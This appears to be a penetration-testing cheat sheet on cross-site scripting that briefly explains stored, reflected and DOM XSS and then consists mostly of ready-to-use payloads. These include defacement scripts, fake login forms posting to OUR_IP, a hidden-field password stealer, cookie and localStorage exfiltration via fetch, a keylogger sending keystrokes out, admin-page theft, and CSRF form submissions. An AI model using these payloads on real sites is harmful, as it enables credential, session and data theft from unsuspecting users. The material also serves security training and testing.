# Cross Site Scripting (XSS)

XSS vulnerabilities take advantage of a flaw in user input sanitization to "write" JavaScript code to the page and execute it on the client side, leading to several types of attacks.
XSS vulnerabilities are solely executed on the client-side and hence do not directly affect the back-end server. They can only affect the user executing the vulnerability. The direct impact of XSS vulnerabilities on the back-end server may be relatively low, but they are very commonly found in web applications, so this equates to a medium risk (low impact + high probability = medium risk), which we should always attempt to reduce risk by detecting, remediating, and proactively preventing these types of vulnerabilities.

**Types of XSS**

There are three main types of XSS vulnerabilities:
| Type                       | Description                                                                                                                                                                                                                   |
|----------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| Stored (Persistent) XSS    | The most critical type of XSS, which occurs when user input is stored on the back-end database and then displayed upon retrieval (e.g., posts or comments)                                                                    |
| Reflected (Non-Persistent) XSS | Occurs when user input is displayed on the page after being processed by the backend server, but without being stored (e.g., search result or error message)                                                                |
| DOM-based XSS              | Another Non-Persistent XSS type that occurs when user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server (e.g., through client-side HTTP parameters or anchor tags) |

**Example Payload**
````
<script> alert(1) </script>
"><script> alert(1) </script>
<img src=x onerror=alert(1)></img>
<svg src=x onerror=alert(1)></svg>
````

## Stored XSS

Stored XSS or Persistent XSS. If our injected XSS payload gets stored in the back-end database and retrieved upon visiting the page, this means that our XSS attack is persistent and may affect any user that visits the page.
This makes this type of XSS the most critical, as it affects a much wider audience since any user who visits the page would be a victim of this attack. Furthermore, Stored XSS may not be easily removable, and the payload may need removing from the back-end database.

## Reflected XSS

Reflected XSS vulnerabilities occur when our input reaches the back-end server and gets returned to us without being filtered or sanitized. There are many cases in which our entire input might get returned to us, like error messages or confirmation messages. In these cases, we may attempt using XSS payloads to see whether they execute. However, as these are usually temporary messages, once we move from the page, they would not execute again, and hence they are Non-Persistent.

## DOM XSS

DOM XSS occurs when JavaScript is used to change the page source through the Document Object Model (DOM).

## Defacing 

Four HTML elements are usually utilized to change the main look of a web page:

- Background Color document.body.style.background
- Background document.body.background
- Page Title document.title
- Page Text DOM.innerHTML

````
<script>document.body.style.background = "#141d2b"</script>
<script>document.title = '<Change Title>'</script>
<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white"><Defacing></h1><p style="color: white">by <img src="<Image>" height="25px" alt="<Defacing>"> </p></center>'</script>
````

## Phishing 

````
<script>document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove(); </script>
````
````
phishing.js

fetch("login").then(res => res.text().then(data => {
document.getElementsByTagName("html")[0].innerHTML = data
document.getElementsByTagName("form")[0].action = "http://<OUR_IP>"
document.getElementsByTagName("form")[0].method = "get"
}))
````
````
StealPasswords.js

let body = document.getElementsByTagName("body")[0]
var u = document.createElement("input");
u.type = "text";
u.style.position = "fixed";
u.style.opacity = "0";

var p = document.createElement("input");
p.type = "password";
p.style.position = "fixed";
p.style.opacity = "0";

body.append(u)
body.append(p)
setTimeout(function(){ 
          fetch("http://<OUR_IP>/k?u=" + u.value + "&p=" + p.value)
}, 5000);
````

## Session Hijacking

### Cookies
````
StealSession.js

let cookie = document.cookie
let encodedCookie = encodeURIComponent(cookie)
fetch("http://<OUR_IP>/exfil?data=" + encodedCookie)

<script src="http://OUR_IP/StealSession.js"></script>
````
````
StealSession2.js

document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie

<script src="http://OUR_IP/StealSession2.js"></script>
````
````
<script>fetch('http://OUR_IP/cookie?c='+document.cookie);</script>
<script>document.location='http://OUR_IP/index.php?c='+document.cookie;</script>
<img src=x onerror=fetch("http://<Our_IP>/?c="+document.cookie></img>
````

### LocalStorage
````
StealLocalStorage.js

let data = JSON.stringify(localStorage)
let encodedData = encodeURIComponent(data)
fetch("http://<Our_IP>/exfil?data=" + encodedData)

<script src="http://OUR_IP/StealLocalStorage.js"></script>
````
````
<img src=x onerror=fetch("http://<Our_IP>/?c="+JSON.stringify(localStorage))></img>
````

## Keylooger

````
KeyLogger.js

function logkey(event){
  fetch("http://IP/?key="+event.key);
}
document.addEventListener("keydown", logkey);  

<script src="http://OUR_IP/KeyLogger.js"></script>
````

## Steal Pages

````
<script>fetch("http://<admin_page>").then(response => response.text()).then(text => btoa(text)).then(encoded => fetch("http://<OUR_IP>:<PORT>/resp?data="+encoded));</script>
````
````
PageSteal.js

fetch("http://<admin_page>")
  .then(response => response.text())
  .then(text => btoa(text))
  .then(encoded => fetch("http://<OUR_IP>:<PORT>/resp?data="+encoded));

<script src="http://OUR_IP/PageSteal.js"></script>
````

## Cross Site Request Forgery
````
csrf.js

document.write(`
   <html>
  <body>
    <form action="/loginLogout" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="&#95;token" value="m8tXk2sI6KI8Gq5llWNjpFvp0sQBlLgYCvvhZKO2" />
      <input type="hidden" name="username" value="myadmin" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
`);

<script src="http://OUR_IP/csrf.js"></script>
````
````
<script>fetch("http://<admin_page>/add?email=<email>&password=<password>&name=<name>&username=<user>").then(response => response.text()).then(text => btoa(text)).then(encoded => fetch("http://<OUR_IP>:<PORT>/resp?data="+encoded));</script>
````

## Auto Discovery 
````
$ git clone https://github.com/s0md3v/XSStrike.git
$ cd XSStrike
$ pip install -r requirements.txt
$ python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"
````
